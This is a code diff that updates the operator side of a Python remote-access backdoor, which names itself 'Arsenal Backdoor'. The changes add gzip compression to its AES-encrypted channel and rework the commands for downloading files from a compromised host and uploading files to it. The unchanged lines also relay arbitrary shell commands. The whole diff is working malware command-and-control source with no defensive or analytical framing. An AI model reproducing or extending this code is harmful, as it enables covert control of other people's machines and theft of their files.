@@ -27,6 +27,7 @@ def do_encrypt(message):
         pass
     else:
         message = bytes(message, 'utf-8')
+    message = gzip.compress(message)
     length = 16 - (len(message) % 16)
     message += bytes([length])*length
     obj = AES.new(aeskey, AES.MODE_CBC, aesiv)
@@ -36,7 +37,7 @@ def do_encrypt(message):
 def do_decrypt(ciphertext):
     obj2 = AES.new(aeskey, AES.MODE_CBC, aesiv)
     message = obj2.decrypt(ciphertext)
-    return message[:-message[-1]]
+    return gzip.decompress(message[:-message[-1]])
 
 def get_data(conn, buff):
     bs = conn.recv(8)
@@ -61,13 +62,7 @@ def client(conn, addr, buff):
     sendit(conn, do_encrypt('Arsenal Backdoor'))
     while True:
         data = get_data(conn, buff)
-        if 'get_file' in reply:
-            with open(reply.split(' ')[2], 'wb+') as f:
-                f.write(do_decrypt(data))
-        elif 'Updated' in str(do_decrypt(data).strip(), 'utf-8'):
-            print(str(do_decrypt(data).strip()))
-            sys.exit()
-        elif data == 0:
+        if data == 0:
             break
         else:
             print(str(do_decrypt(data).strip(), 'utf-8'))
@@ -77,15 +72,22 @@ def client(conn, addr, buff):
             except ValueError:
                 print("Bad input")
             if reply == 'help':
-                print('update_key\nget_file /path/to/file')
+                print('update_key\nget_file /path/to/file filename\nsend_file filename /path/to/file')
             elif reply == "update_key":
                 sendit(conn, update_aeskeys())
                 break
             elif 'get_file' in reply:
                 sendit(conn, do_encrypt(reply))
+                data1 = get_data(conn, buff)
+                with open(reply.split(' ')[2], 'wb+') as f:
+                    f.write(do_decrypt(data1))
                 break
-            elif reply.strip() == 'Arsenal Backdoor':
-                continue
+            elif 'send_file' in reply:
+                sendit(conn, do_encrypt(reply))
+                with open(reply.split(' ')[1], 'rb') as f:
+                    tmp = f.read()
+                sendit(conn, do_encrypt(tmp))
+                break
             else:
                 sendit(conn, do_encrypt('cmd ' + reply))
                 break
@@ -115,12 +117,6 @@ def main():
         except KeyboardInterrupt:
             print('[-] Server shutting down...')
             break
-
-def draw_screen():
-    global menu
-    os.system('clear')
-    print(menu)
-
 
 if __name__ == '__main__':
     main()
